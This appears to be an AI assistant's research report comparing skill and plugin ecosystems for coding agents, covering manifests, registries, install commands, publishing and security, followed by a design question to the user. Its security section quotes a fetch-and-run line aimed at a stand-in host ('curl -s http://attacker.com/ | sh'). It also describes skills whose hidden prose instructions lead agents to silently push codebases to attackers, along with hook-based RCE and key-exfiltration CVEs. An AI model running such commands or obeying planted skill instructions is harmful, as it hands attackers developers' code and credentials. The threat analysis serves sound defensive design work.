content.text:
I now have comprehensive data across all five dimensions. Let me compile the full report.

---

## Dimension 1 — Artifact Structure

### Claude Code Skills / Plugins

**Artifact type:** A skill is a directory containing a `SKILL.md` file, not a compiled binary or archive. Plugins are multi-component directories containing one or more skills plus optional agents, hooks, MCP server configs, and LSP server configs.

**Manifest schema — `SKILL.md` YAML frontmatter:**

| Field | Required | Type | Notes |
|---|---|---|---|
| `name` | Yes | string | Lowercase, hyphenated, max 64 chars; must match parent directory name |
| `description` | Yes | string | Max 1,024 chars; the primary signal Claude uses for auto-invocation |
| `allowed-tools` | No | string | Comma-separated tool permissions (e.g., `"Read,Write,Bash(git:*)"`); scoped to skill duration |
| `model` | No | string | Override session model |
| `version` | No | string | Semver metadata only; not enforced by the runtime |
| `license` | No | string | License identifier |
| `compatibility` | No | string | Agent compatibility notes |
| `metadata` | No | object | Free-form metadata |
| `disable-model-invocation` | No | boolean | When `true`, prevents automatic skill discovery; forces manual invocation only |
| `mode` | No | string | Categorizes skill as a mode command with elevated visibility |
| `when_to_use` | No | string | Undocumented; appended to description; use with caution |

**Plugin manifest — `.claude-plugin/plugin.json`:**

| Field | Required | Notes |
|---|---|---|
| `name` | Yes | Kebab-case |
| `description` | No | Brief purpose |
| `version` | No | Semver |
| `author` | No | Object with `name`, `email` |
| `skills` | No | Path(s) to skill directories |
| `agents` | No | Path(s) to `.md` agent files |
| `hooks` | No | Path to `hooks.json` or inline |
| `mcpServers` | No | Path to `.mcp.json` or inline |
| `lspServers` | No | LSP server config |
| `userConfig` | No | Values Claude Code prompts the user for at enable time |
| `strict` | No | Whether `plugin.json` is the authority for all component definitions |

**Directory layout:**
```
plugin-name/
├── .claude-plugin/
│   └── plugin.json        # Core manifest
├── skills/
│   └── <skill-name>/
│       ├── SKILL.md       # Required
│       ├── references/    # Optional documentation
│       ├── scripts/       # Optional executable code
│       └── assets/        # Optional templates/static files
├── agents/
│   └── *.md
├── hooks/
│   └── hooks.json
└── .mcp.json
```

**Packaging format:** Directory. No archive format. Distributed via Git repositories. The runtime reads plaintext `SKILL.md` files directly; nothing is compiled or bundled.

**Runtime loading:** Progressive disclosure — Claude Code reads only `name` and `description` from frontmatter at startup (embedded in the Skill meta-tool description as an `<available_skills>` list). Full `SKILL.md` body is injected as two user messages only when Claude invokes the skill: one visible metadata message and one hidden instruction block (`isMeta: true`).

---

### GitHub Copilot CLI Plugins

**Manifest file:** `plugin.json` at the plugin root. Discovery order: `.plugin/plugin.json` → `plugin.json` → `.github/plugin/plugin.json` → `.claude-plugin/plugin.json`.

**Schema:**

| Field | Required | Notes |
|---|---|---|
| `name` | Yes | Kebab-case, max 64 chars |
| `description` | No | Max 1,024 chars |
| `version` | No | Semver |
| `author` | No | Object: `name` (required if present), `email`, `url` |
| `homepage`, `repository`, `license`, `keywords` | No | Discoverability metadata |
| `category`, `tags` | No | Classification |
| `agents` | No | Default: `agents/`; files are `*.agent.md` |
| `skills` | No | Default: `skills/`; skill subdirs contain `SKILL.md` |
| `commands` | No | Command directories |
| `hooks` | No | Config file path or inline object |
| `mcpServers` | No | MCP config path or inline |
| `lspServers` | No | LSP config path or inline |

**Directory layout:**
```
plugin-name/
├── plugin.json        # or .plugin/plugin.json
├── agents/
│   └── *.agent.md
├── skills/
│   └── <skill-name>/
│       └── SKILL.md
├── hooks.json
└── .mcp.json
```

**Packaging format:** Directory or Git repository. No archive.

---

### OpenAI Codex CLI Plugins

**Manifest file:** `.codex-plugin/plugin.json` at the plugin root.

**Schema:**

| Field | Required | Notes |
|---|---|---|
| `name` | Yes | Kebab-case |
| `version` | Yes | Semver |
| `description` | Yes | Brief overview |
| `author`, `homepage`, `repository`, `license`, `keywords` | No | Publisher metadata |
| `skills` | No | Path to skill definitions |
| `mcpServers` | No | MCP server config |
| `apps` | No | App integration mappings |
| `hooks` | No | Lifecycle automation |
| `interface` | No | Display metadata: `displayName`, `shortDescription`, `longDescription`, `developerName`, `category`, `capabilities`, `websiteURL`, `privacyPolicyURL`, `termsOfServiceURL`, `defaultPrompt`, `brandColor`, `composerIcon`, `logo`, `screenshots` |

**Directory layout:**
```
plugin-name/
├── .codex-plugin/
│   └── plugin.json
├── skills/
│   └── **SKILL.md      # Only files named exactly SKILL.md recognized
├── hooks/
├── .app.json
├── .mcp.json
└── assets/
```

Skills: `~/.codex/skills/**/SKILL.md`. Only files named exactly `SKILL.md` are recognized.

**Packaging format:** Directory. Plugin install cache: `~/.codex/plugins/cache/$MARKETPLACE_NAME/$PLUGIN_NAME/$VERSION/`; local versions use `local` as the version token.

---

### Gemini CLI Extensions

**Manifest file:** `gemini-extension.json` at the extension root.

**Schema:**

| Field | Required | Notes |
|---|---|---|
| `name` | Yes | Lowercase, numbers, dashes; must match directory name |
| `version` | Yes | Semver |
| `description` | Yes | Purpose description |
| `mcpServers` | No | Map of MCP server configs (`command`, `args`, `cwd`) |
| `contextFileName` | No | Defaults to `GEMINI.md` if not specified |
| `excludeTools` | No | Array of tool names to exclude (e.g., `"run_shell_command(rm -rf)"`) |
| `migratedTo` | No | URL to replacement repository |
| `plan` | No | Object with `directory` for planning artifacts |
| `settings` | No | Array of user-configurable settings (`name`, `description`, `envVar`, `sensitive`) |
| `themes` | No | Custom theme definitions |

**Directory layout:**
```
my-extension/
├── gemini-extension.json   # Required manifest
├── GEMINI.md               # Optional context file
├── .env                    # Settings storage (generated at install)
├── commands/
│   ├── deploy.toml         # → /deploy
│   └── gcs/sync.toml       # → /gcs:sync
├── hooks/
│   └── hooks.json
├── skills/
│   └── <skill-name>/
│       └── SKILL.md
├── agents/
│   └── <agent-name>.md
└── policies/
    └── *.toml
```

**Packaging format:** Git repository. Gemini CLI creates a local copy at install time. `${extensionPath}` variable is available for path substitution in config.

---

### Windsurf Skills

**Manifest:** `SKILL.md` with YAML frontmatter. No separate JSON manifest. Required fields: `name` (lowercase, hyphens), `description`. Optional: `license`, `compatibility`, `metadata`.

**Install paths:**
- Workspace: `.windsurf/skills/<skill-name>/`
- Global: `~/.codeium/windsurf/skills/<skill-name>/`
- System (enterprise/read-only): macOS `/Library/Application Support/Windsurf/skills/`, Linux `/etc/windsurf/skills/`, Windows `C:\ProgramData\Windsurf\skills\`
- Cross-agent fallback: `.agents/skills/`, `~/.agents/skills/`, `.claude/skills/`

---

### Cursor Extensions

Cursor uses the VS Code extension format. Extensions are `.vsix` files (ZIP-based archives renamed `.vsix`). The manifest is `package.json` at the root of the extension directory with VS Code extension fields.

Key `package.json` fields: `name`, `displayName`, `description`, `version`, `publisher`, `engines.vscode`, `main` (entry point JS), `contributes`, `activationEvents`, `dependencies`.

**Registry:** Cursor transitioned to OpenVSX (open-vsx.org) after a licensing dispute with Microsoft's VS Code Marketplace. OpenVSX is governed by the Eclipse Foundation and serves 10,000+ extensions.

**Packaging format:** `.vsix` (ZIP archive containing compiled JS, `package.json`, and assets). Install via `cursor --install-extension path/to/extension.vsix`.

---

### Kiro (AWS) Skills/Powers

Skills follow the cross-ecosystem `SKILL.md` format. Required fields: `name`, `description`. Optional: `license`, `compatibility`, `metadata`.

Install paths:
- Workspace: `.kiro/skills/`
- Global: `~/.kiro/skills/`

"Powers" are Kiro's higher-level bundles that combine MCP servers, steering files, and agent hooks. One-click install from within the IDE. No separate manifest format documented; powers are distributed via the `kirodotdev/powers` GitHub repository.

---

## Dimension 2 — Distribution & Hosting

### skills.sh (Vercel Labs)

**Registry type:** GitHub-backed, decentralized. There is no central package registry analogous to npmjs.com. GitHub repositories are the source of truth.

**Index structure:** The skills.sh website at `https://www.skills.sh/` acts as a leaderboard and discovery layer tracking install telemetry. Skills appear in the directory through install telemetry, not through an explicit submission process. The `vercel-labs/skills` GitHub repository (19.6k stars) is the CLI source and the reference implementation.

**Discovery mechanics:** `npx skills find [keyword]` queries skills.sh's index. Skills are ranked by installation count (top skills exceed 1.5M installs). Categories include React, Next.js, Design & UI, Databases, Testing, Marketing. Socket.dev security scan results are displayed inline for each skill on skills.sh.

**Package index:** No authoritative JSON index file. Skills are discovered through GitHub repository content, not through a centralized manifest registry.

**Skill count:** 60,000+ indexed skills as of May 2026.

---

### Claude Code Plugin Marketplace

**Registry type:** Git-backed (GitHub, GitLab, npm, local paths all supported).

**Index structure:** `marketplace.json` files in `.claude-plugin/` directories. The official Anthropic marketplace lives at `https://raw.githubusercontent.com/anthropics/claude-plugins-official/main/.claude-plugin/marketplace.json`.

**`marketplace.json` schema:**
```json
{
  "$schema": "https://anthropic.com/claude-code/marketplace.schema.json",
  "name": "marketplace-name",
  "description": "...",
  "owner": { "name": "...", "email": "..." },
  "plugins": [
    {
      "name": "plugin-id",
      "description": "...",
      "author": { "name": "...", "email": "...", "url": "..." },
      "category": "...",
      "source": {
        "source": "git-subdir|url|local-path",
        "url": "https://github.com/owner/repo.git",
        "path": "plugins/plugin-name",
        "ref": "main",
        "sha": "commit-hash"    // version pinning via SHA
      },
      "homepage": "...",
      "version": "1.0.0",
      "strict": false,
      "tags": ["community-managed"]
    }
  ]
}
```

The official Anthropic marketplace contains 100+ plugins. The `sha` field in source enables commit-level version pinning.

**Discovery:** `/plugin marketplace browse` in the Claude Code CLI. Multiple marketplaces can be registered. LiteLLM can act as a centralized enterprise marketplace proxy.

---

### GitHub Copilot CLI Plugin Marketplaces

**Registry type:** Git-backed. Two marketplaces ship by default:
- `copilot-plugins`: `https://github.com/github/copilot-plugins`
- `awesome-copilot`: `https://github.com/github/awesome-copilot`

**Index structure:** `marketplace.json` at `.github/plugin/marketplace.json`. The `awesome-copilot` repository auto-generates this file from individual plugin directories via `eng/generate-marketplace.mjs`. Registry URL: `https://raw.githubusercontent.com/github/awesome-copilot/main/.github/plugin/marketplace.json`

**Install paths:** `~/.copilot/installed-plugins/MARKETPLACE/PLUGIN-NAME` (marketplace installs); `~/.copilot/installed-plugins/_direct/SOURCE-ID/` (direct installs).

**Loading precedence:** "First-found-wins" for agents/skills (project overrides personal overrides plugin). "Last-wins" for MCP servers. Built-in tools cannot be overridden.

---

### OpenAI Codex CLI Plugin Marketplace

**Status (as of May 2026):** "Adding plugins to the official Plugin Directory is coming soon. Self-serve plugin publishing and management are coming soon." The GUI browser in the app and `/plugins` command in the CLI are available for installing existing plugins.

**Install path:** `~/.codex/plugins/cache/$MARKETPLACE_NAME/$PLUGIN_NAME/$VERSION/`

**Config:** Plugin state in `~/.codex/config.toml`. Set `enabled = false` to disable a plugin without uninstalling.

**Policy files:** Administrators can govern plugin availability through JSON policy files controlling which plugins are pre-installed, available on request, or blocked.

---

### Gemini CLI Extensions

**Registry type:** GitHub-backed. The `geminicli.com/extensions/browse/` gallery acts as a discovery layer (community-curated, not an official Google registry). The `gemini-cli-extensions` GitHub organization hosts official extensions. A community-curated list exists at `github.com/Piebald-AI/awesome-gemini-cli-extensions`.

**No formal JSON index:** Extensions are installed directly from GitHub URLs. No central registry JSON file. Install by URL: `gemini extensions install https://github.com/gemini-cli-extensions/workspace`.

**Important note:** "Gemini CLI will be replaced by Antigravity CLI on June 18th" for unpaid tier and Google One users (announcement May 2026). Google's official documentation states: "Google does not vet, endorse, or guarantee the functionality or security of these extensions."

---

### Cursor / OpenVSX

**Registry type:** Centralized, self-hosted. OpenVSX at `open-vsx.org` is governed by the Eclipse Foundation. 10,000+ extensions. Peak daily traffic exceeds 50M requests.

**Architecture:** RESTful API backend, web UI, and `ovsx` CLI for publishers. Extensions stored as `.vsix` files on CDN. Index queryable via API.

**Security:** Less rigorous than VS Code Marketplace. OpenVSX added identifiable token prefixes (`ovsxp_`) after the Wiz research findings (2025).

---

## Dimension 3 — Install Semantics

### skills.sh / npx skills

| Command | Effect |
|---|---|
| `npx skills add <owner/repo>` | Install all skills from a GitHub repo |
| `npx skills add <url>` | Install from GitHub URL, GitLab URL, any git URL, or local path |
| `npx skills add -g <owner/repo>` | Install globally |
| `npx skills add --agent <name>` | Target specific agent |
| `npx skills add --skill <name>` | Install specific skill from repo |
| `npx skills add -y` | Skip confirmation prompts (CI) |
| `npx skills list` | View installed skills |
| `npx skills find [keyword]` | Search directory |
| `npx skills update` | Update all installed skills (interactive) |
| `npx skills update --yes` | Non-interactive update |
| `npx skills check` | Check for available updates (compares `skillFolderHash`) |
| `npx skills remove` | Uninstall |
| `npx skills init [name]` | Scaffold new skill |
| `npx skills experimental_install` | Restore from `skills-lock.json` |

**Install paths per agent** (auto-detected):

| Agent | Project scope | Global scope |
|---|---|---|
| Claude Code | `.claude/skills/` | `~/.claude/skills/` |
| GitHub Copilot | `.github/skills/` | `~/.github/skills/` |
| Cursor | `.cursor/skills/` | `~/.cursor/skills/` |
| Codex | `.codex/skills/` | `~/.codex/skills/` |
| Gemini CLI | `.gemini/skills/` | `~/.gemini/skills/` |
| Windsurf | `.windsurf/skills/` | `~/.codeium/windsurf/skills/` |
| Cross-agent | `.agents/skills/` | `~/.agents/skills/` |

**Version pinning:** `skills-lock.json` records `skillFolderHash` for installed skills. No SemVer pinning by default — fetches from `main` branch. Lock file mechanism available but not enforced on initial install.

**Known path mismatch (conflicting information found):** One source states `npx skill install` drops skills into `~/.agents/skills/` but Claude Code reads `~/.claude/skills/`. The `--agent claude` flag or explicit path targeting resolves this.

**Rollback:** No dedicated rollback command. `experimental_install` restores from lock file. No per-skill version history.

**Dependency resolution:** No dependency system. Skills are self-contained markdown directories with optional scripts. No `package.json`-style dependency graph.

---

### Claude Code

| Command | Effect |
|---|---|
| `/plugin install <source>` | Install plugin |
| `/plugin marketplace add <url>` | Register a marketplace |
| `/plugin marketplace update` | Refresh marketplace listing |
| `/plugin list` | List installed plugins |
| `/plugin uninstall <name>` | Remove plugin |

Skills from plugins auto-discovered at startup. Version pinning via `sha` field in `marketplace.json`.

**Claude Code skill discovery paths:**
1. `~/.config/claude/skills/` (user/global)
2. `.claude/skills/` (project)
3. Plugin-provided skills (via plugin config)
4. Built-in skills (hardcoded)

---

### GitHub Copilot CLI

| Command | Effect |
|---|---|
| `copilot plugin install PLUGIN@MARKETPLACE` | Install from registered marketplace |
| `copilot plugin install OWNER/REPO` | Install from GitHub |
| `copilot plugin install ./local-path` | Install from local path |
| `copilot plugin install GIT_URL` | Install from arbitrary Git URL |
| `copilot plugin uninstall NAME` | Remove |
| `copilot plugin list` | List installed |
| `copilot plugin update NAME` | Update to latest |
| `copilot plugin marketplace list` | List registered marketplaces |
| `copilot plugin marketplace browse NAME` | Browse marketplace |
| `copilot plugin marketplace add ORG/REPO` | Register a marketplace |
| `/plugin install ...` | In-session equivalent |

**Install paths:** `~/.copilot/installed-plugins/MARKETPLACE/PLUGIN-NAME` (marketplace); `~/.copilot/installed-plugins/_direct/SOURCE-ID/` (direct).

**No version pinning mechanism documented.** Update fetches latest. No rollback.

---

### OpenAI Codex CLI

| Command | Effect |
|---|---|
| `/plugins` | Interactive plugin browser (in-session) |
| Plugin install from GUI | Via Codex app plugin browser |

Skills: `~/.codex/skills/**/SKILL.md`. Config: `~/.codex/config.toml`. Disable a plugin: set `enabled = false` in config.toml.

---

### Gemini CLI

| Command | Effect |
|---|---|
| `gemini extensions install <url>` | Install from GitHub URL |
| `gemini extensions install --ref <branch/tag/sha>` | Install specific ref |
| `gemini extensions install --auto-update` | Enable auto-updates |
| `gemini extensions install --consent` | Skip consent prompt |
| `gemini extensions uninstall <name>` | Remove |
| `gemini extensions enable/disable <name>` | Toggle without uninstall |
| `gemini extensions update <name>` | Update specific extension |
| `gemini extensions update --all` | Update all |
| `gemini extensions new <path>` | Create new extension |
| `gemini extensions link <path>` | Link for development (symlink-style) |

**Install path:** `~/.gemini/extensions/<extension_name>/`. Skills within extensions install to `~/.gemini/extensions/<extension_name>/skills/`.

**Version pinning:** `--ref <ref>` at install time. Must run `gemini extensions update` manually; not auto-updating unless `--auto-update` was passed at install.

---

### Cursor

| Command | Effect |
|---|---|
| `cursor --install-extension path/to/file.vsix` | Install from VSIX |
| GUI marketplace | One-click from OpenVSX browser |

No version pinning for community extensions beyond marketplace CDN versioning. Auto-updates enabled by default.

---

## Dimension 4 — Publish / Auth Model

### skills.sh / npx skills

**Who can publish:** Anyone with a public GitHub repository. No registration, no account creation on skills.sh required.

**Auth flow:** None. Publishing means creating a public GitHub repo with a `SKILL.md` file in a directory. Skills appear in the skills.sh directory organically through install telemetry — there is no explicit "submit" step.

**Token requirements:** None for publishing. GitHub OAuth required only for publishing to **private** repositories or for platforms like SkillUse that offer explicit publish commands (`skilluse publish`).

**Verified publisher program:** None on skills.sh. Socket.dev scans are displayed inline and provide a trust signal, but there is no verified badge or publisher vetting.

**Barrier to publish:** One-week-old GitHub account + a `SKILL.md` file. No code review, no security audit, no legal agreement.

---

### Claude Code Plugin Marketplace

**Who can publish:** Two-tier model:
1. **Official Anthropic marketplace** (`anthropics/claude-plugins-official`): Via pull request to the GitHub repository. Anthropic or maintainers review.
2. **Self-hosted marketplaces:** Anyone can create a marketplace by hosting a `marketplace.json` on GitHub/GitLab/local. No auth required with Anthropic.

**Auth flow:** For official marketplace, standard GitHub PR. For private marketplaces, Git credential configured on client side.

**Verified publisher:** The `sha` field in `marketplace.json` pins plugins to specific commits, providing integrity at the marketplace catalog level. No cryptographic signing of the plugin content itself.

**No code signing requirement** documented for plugins.

---

### GitHub Copilot CLI Plugin Marketplaces

**Who can publish:** Any developer can create a marketplace by hosting a `marketplace.json`. Contributing to the built-in `awesome-copilot` requires a PR to `github/awesome-copilot`.

**Auth flow:** Standard GitHub OAuth (users must authenticate to install from private repos). Enterprise administrators can distribute plugins to all users in the organization via managed plugins (public preview May 2026).

**Enterprise distribution:** Administrators can configure plugins to auto-install for all enterprise users, enabling centralized governance.

**No verified publisher program** documented beyond GitHub account identity.

---

### OpenAI Codex CLI

**Status:** Self-serve plugin publishing is "coming soon" as of May 2026. Current plugins are OpenAI-curated (Box, Figma, Linear, Notion, Sentry, Slack, Gmail, Hugging Face, launched March 27, 2026). OpenAI controls the official Plugin Directory.

**Policy files:** Admins can control plugin availability enterprise-wide via JSON policy files.

---

### Gemini CLI

**Who can publish:** Anyone can publish a GitHub repository with a `gemini-extension.json`. Inclusion in the community gallery at `geminicli.com/extensions/` is informal. Google does not vet extensions.

**Auth flow:** None required for publishing. Consumers install by URL.

**No verified publisher program.** Google's explicit disclaimer: they "do not vet, endorse, or guarantee the functionality or security of these extensions."

---

### VS Code Marketplace / Cursor (OpenVSX)

**VS Code Marketplace (for reference):**
- Requires Azure DevOps account and Personal Access Token (PAT) with Marketplace Manage scope
- `vsce publish` command using PAT
- Malware scanning (multi-AV), dynamic sandbox analysis, secret scanning pre-publication
- Verified Publisher badge (blue checkmark) after identity verification
- Name squatting prevention
- Automatic uninstallation of block-listed extensions

**OpenVSX (used by Cursor):**
- Less rigorous than VS Code Marketplace
- Requires Eclipse Foundation OpenVSX account
- Token prefix: `ovsxp_` (added after Wiz findings)
- No pre-publication malware scanning equivalent to VS Code Marketplace (conflicting information — some sources indicate scanning was added post-Wiz-report)
- Verified via Eclipse Foundation governance, not individual publisher identity verification

---

## Dimension 5 — Security Model

### Code Signing

**None of the skill/plugin ecosystems (Claude Code, GitHub Copilot CLI, skills.sh, Gemini CLI, Windsurf, Kiro) require or implement cryptographic code signing on skill content.** Skills are plaintext markdown files. Plugin manifests include optional `sha` fields for Git commit pinning (Claude Code, some Copilot marketplaces), which provides integrity against tampering of a *specific* fetched commit but does not sign the skill content itself.

VS Code Marketplace is the sole marketplace in this ecosystem that signs packages: "The Visual Studio Marketplace signs all extensions when they're published. VS Code checks this signature when you install an extension to verify the integrity and the source." OpenVSX does not implement equivalent signing.

---

### Sandboxing

**No agent provides true sandboxing for skill content execution.** Key findings:

- **Claude Code:** Skills are "injected instructions that guide Claude's behavior" — not separate processes. Scripts in `scripts/` directories execute as shell commands with the same permissions as the Claude Code process (full user filesystem access). CVE-2025-59536 (CVSS 8.7) demonstrated pre-consent RCE via malicious hooks in `.claude/settings.json`. CVE-2026-21852 (CVSS 5.3) demonstrated API key exfiltration via `ANTHROPIC_BASE_URL` override. Patches in Claude Code 2.0.65+ deferred API requests and hook execution until after explicit trust dialog.

- **Cursor:** Extensions run in the VS Code extension host with full process permissions. Skills/instructions in `.cursor/skills/` execute with agent permissions. An independent proof-of-concept (Mitiga Labs) demonstrated complete codebase exfiltration from Cursor in 4 user interactions, leaving `skill-audit.log` completely empty.

- **GitHub Copilot CLI:** Plugins communicate over JSON-RPC via stdio as child processes. Extensions intercept agent at session start, prompt submission, before/after tool use, on errors. No sandbox boundary documented. Built-in tools cannot be overridden.

- **Gemini CLI:** Sensitive settings stored in system keychain. Extensions receive only allowlisted environment variables. `excludeTools` field allows restricting tool access. Still: no process isolation for MCP servers launched by extensions.

- **OpenAI Codex CLI:** `config.toml` supports sandbox levels and approval modes. Three sandbox levels configurable. Project-scoped config loaded only when project is trusted. Manifest hook paths must resolve within the plugin root (path traversal prevention). Weakest sandbox level still grants shell access.

---

### Trust Levels

| Ecosystem | Trust Tiers |
|---|---|
| skills.sh | None. All skills equal. Socket.dev scan displayed but non-blocking. |
| Claude Code marketplace | Anthropic-curated official marketplace vs. community-hosted marketplaces vs. direct git installs |
| GitHub Copilot CLI | Default marketplaces (copilot-plugins, awesome-copilot) vs. user-added; enterprise-managed vs. self-installed |
| OpenVSX / Cursor | Eclipse Foundation governance; no per-publisher tiers |
| VS Code Marketplace | Verified Publisher badge (identity-verified); no badge (unverified) |
| Gemini CLI | No tiers; all community, no Google endorsement |

---

### Known Incidents and CVEs

| Incident | Date | Severity | Details |
|---|---|---|---|
| CVE-2025-59536 | 2025 | CVSS 8.7 | Claude Code RCE via malicious hooks in `.claude/settings.json`; code executes at SessionStart before user trust dialog |
| CVE-2026-21852 | 2026 | CVSS 5.3 | Claude Code API key exfiltration via `ANTHROPIC_BASE_URL` override in project config; credentials sent to attacker server before consent dialog |
| ClawHavoc campaign | Jan 2026 | Critical | 1,184 skills (~20% of ClawHub ecosystem) compromised; harvested API keys, SSH credentials, 60+ cryptocurrency wallet types |
| MedusaLocker skill | Dec 2025 | Critical | Ransomware deployed via skill advertised as "GIF converter" on ClawHub |
| ToxicSkills study | Feb 2026 | Research | 534 skills (13.4% of 3,984 scanned) contain critical security flaws; 76 confirmed malicious payloads; 36.82% have at least one security issue |
| Solidity extension attack | Jun 2025 | Critical | Fake "Solidity Language" extension on OpenVSX led to $500,000 cryptocurrency theft; 54k installs via inflated counts |
| Nx Console compromise | 2025 | High | Stolen `VSCE_PAT` used to publish malicious VS Code extension update to 150,000+ users; detected in 11 minutes |
| Wiz secrets leak | 2025 | High | 550+ secrets in VS Code extensions; 100+ valid marketplace PATs and 30+ OpenVSX tokens discovered |
| Silent exfiltration PoC | 2026 | High | Mitiga Labs: full codebase exfiltrated from Cursor in 4 interactions; zero audit trail |
| Claude Code sandbox bypass | v2.0.24–v2.1.89 | Medium | SOCKS5 hostname null-byte injection; affected every Claude Code release in range |

---

### Supply Chain Attack Surface Summary

The `safedep.io` threat model identifies 10 attack vectors across 3 layers (delivery, runtime, persistence). The arxiv paper (2604.02837) identifies 7 threat categories with 17 scenarios across the same 3 layers. Key structural vulnerabilities shared across all skill ecosystems:

1. **No mandatory pre-publication security review** on skills.sh, Gemini CLI, GitHub Copilot CLI community marketplaces
2. **No code signing** on any skill-based ecosystem
3. **No install-time hash verification** beyond optional `sha` pinning in marketplace catalog files (Claude Code, partial)
4. **Post-review weaponization window:** Skills can be modified after passing scan; updates are pulled from `main` branch by default
5. **Silent bulk updates:** `npx skills update --yes` updates all installed skills without per-skill review
6. **Namespace collisions:** No global namespace ownership; identical-named skills from different repos can silently overwrite each other
7. **Install count spoofing:** Unauthenticated telemetry endpoints; no rate limiting
8. **Deferred runtime dependencies:** PEP 723-style inline script dependencies resolved at runtime; attacker can publish a malicious package version post-review
9. **Payload-less attacks:** Prose instructions evade static scanning; agents synthesize exfiltration scripts at runtime

---

## Security Risk Summary

Ranked from highest to lowest severity:

**1. Malicious skill with embedded script execution (Critical)**
A published skill includes a `scripts/` directory with a Python or Bash file containing `os.system("curl -s http://attacker.com/ | sh")`. The skill passes initial review as benign markdown. Scripts execute with full user agent permissions — same UID as the developer. No sandbox, no approval prompt for script execution once skill is invoked. Demonstrated: Socket found a Polymarket skill doing exactly this. CVSS analogues: 9.0+.

**2. Post-install weaponization / bait-and-switch (Critical)**
Attacker publishes legitimate skill, builds install count (possibly via spoofed telemetry), then modifies the GitHub repository to add malicious instructions or scripts. Users who run `npx skills update` receive the payload. No per-skill changelog review, no version pinning by default, no alert. Exploited in ClawHavoc (1,184 skills). No countermeasure in skills.sh default workflow.

**3. Silent codebase exfiltration via skill instructions (Critical)**
Malicious skill uses prose instructions (no code) to instruct the agent to silently `git push` the project to an attacker-controlled repo. No static scanner flags prose. Zero audit log entries. Demonstrated by Mitiga Labs against Cursor in 4 interactions. Applies to all agents that have filesystem + git tool access.

**4. Namespace collision / silent skill override (High)**
Installing a skill whose `name` field matches an existing trusted skill silently overwrites it with no diff, no warning, no confirmation. Attacker creates a typosquatted or identically-named skill. `npx skills add malicious-org/popular-skill-name` overwrites `trusted-org/popular-skill-name`.

**5. Credential harvesting via environment variable access (High)**
Skills with access to shell execution can read `$ANTHROPIC_API_KEY`, `$OPENAI_API_KEY`, `$AWS_SECRET_ACCESS_KEY` etc. from the environment. ClawHavoc harvested API keys, SSH credentials, and 60+ cryptocurrency wallet categories via this vector.

**6. CVE-2025-59536 — Pre-consent RCE via malicious project hooks (High, CVSS 8.7)**
Malicious `.claude/settings.json` in a repository defines a `SessionStart` hook that executes arbitrary shell commands before the user sees the trust dialog. Patched in Claude Code 2.0.65+ but still exploitable in earlier versions. Attack vector: contribute to any repository a developer opens in Claude Code.

**7. OpenVSX extension confusion / typosquatting (High)**
Cursor uses OpenVSX which has less rigorous security controls than VS Code Marketplace. Attacker publishes an extension with a name visually similar to a popular extension (e.g., `juan-blanco` vs `juanblanco`). Result: $500,000 cryptocurrency theft in June 2025 via fake Solidity extension with 54k installs.

**8. CVE-2026-21852 — API token exfiltration via endpoint redirect (Medium, CVSS 5.3)**
Malicious `ANTHROPIC_BASE_URL` override in project `.claude/settings.json` redirects all API traffic to an attacker server before the trust dialog appears. API keys transmitted in plaintext Authorization headers. Patched in Claude Code 2.0.65+.

**9. Deferred dependency attacks (Medium)**
Skill scripts reference PyPI/npm packages without pinned versions (e.g., `# /// script\n# dependencies = ["requests"]\n`). Attacker claims or uploads a malicious version of the dependency package post-review. Code that runs is determined at runtime, not at review time.

**10. Leaked publisher tokens enabling supply chain injection (Medium)**
Wiz found 100+ valid VS Code Marketplace PATs and 30+ OpenVSX tokens in published extension packages. A stolen PAT enables pushing malicious extension updates to the full install base. Nx Console incident: 150,000+ users exposed before detection in 11 minutes.

**11. Claude Code sandbox network bypass — null-byte injection (Medium)**
SOCKS5 hostname null-byte injection in all Claude Code releases v2.0.24–v2.1.89 allowed bypassing the sandbox network layer. Vendor recommends treating the sandbox as defense-in-depth, not a security boundary.

**12. Enterprise-managed plugin auto-distribution (Medium, structural)**
GitHub Copilot CLI enterprise-managed plugins (public preview May 2026) allow administrators to auto-install plugins for all users. A compromised administrator account or a malicious plugin approved by a negligent admin propagates malware org-wide with no per-user consent.

**13. Install count spoofing distorting trust signals (Low-Medium)**
Unauthenticated GET requests to skill telemetry endpoints inflate popularity metrics. No rate limiting. Attackers position malicious skills above legitimate alternatives in search results and leaderboards.

**14. Payload-less natural language attacks (Low-Medium, emerging)**
Malicious skills use only prose instructions to achieve attacker goals without any detectable code. Current static scanners and Socket.dev analysis struggle to flag purely behavioral attacks. ArXiv paper (2605.14460) demonstrates exfiltration via pure markdown instructions with no shell commands.

---

**Structural reform requirements** (per arxiv 2604.02837): The highest-severity risks arise from structural properties — collapsed data-instruction boundary, single-approval persistent trust, absent marketplace vetting, no cryptographic provenance. Incremental mitigations are insufficient. Required: typed capability schemas, version-bound fine-grained permission models, mandatory pre-publication review, and cryptographic provenance verification.

---

**Where information was conflicting or missing:**

- OpenAI Codex official Plugin Directory is explicitly "coming soon" — no public manifest schema or auth model for third-party publishing yet exists
- The exact path mismatch between `~/.agents/skills/` (some skills.sh docs) and `~/.claude/skills/` (Claude Code) is confirmed in one source and contradicted by another; the `--agent` flag is the safe resolution
- Windsurf has no documented CLI publish mechanism; skills.sh is the recommended distribution path
- Gemini CLI is transitioning to "Antigravity CLI" — extension compatibility and registry status post-transition is not yet documented
- skills.sh version pinning via `skills-lock.json` is available but not enforced by default on initial install; the `experimental_install` restore command is explicitly labeled experimental

Research complete. Parallel-cli noted for future follow-ups — but the subagent already did the full sweep via WebSearch. Here's what I now understand about the landscape:

---

**Key findings that reframe the design:**

- **Skill** = `SKILL.md` + YAML frontmatter (behavioral instructions). Universal across all agents.
- **Plugin** = bundle: skills + agents + hooks + MCP server configs. Distribution unit.
- **Marketplace** = a hosted `marketplace.json` index pointing to plugin sources. Claude Code's `/plugin marketplace add <url>` registers one.
- **Every ecosystem today** uses Git repos as source of truth. **Our platform hosting the artifacts directly is architecturally novel and correct** — we become the CDN/registry, not just an index pointing elsewhere.
- **Security everywhere is terrible**: no code signing, no sandboxing, no mandatory review. This is a differentiator opportunity.

The management brief's "Git-native" language means **pull/push semantics**, not Git as backing store. Our DB *is* the backing store.

---

**Next question:**

The install target determines the entire delivery architecture. When a user "installs a plugin" from our marketplace:

**Which agent runtimes are in scope for Phase 1?**

A. **Claude Code only** — install writes to `~/.claude/plugins/cache/` via our MCP tool; our platform serves a valid `marketplace.json` that Claude Code can register with `/plugin marketplace add`

B. **Multi-agent from day one** — install targets whichever agent the user has (`~/.agents/skills/`, `~/.copilot/`, `~/.gemini/`, etc.); the `set_me_up` MCP tool detects runtime and installs accordingly

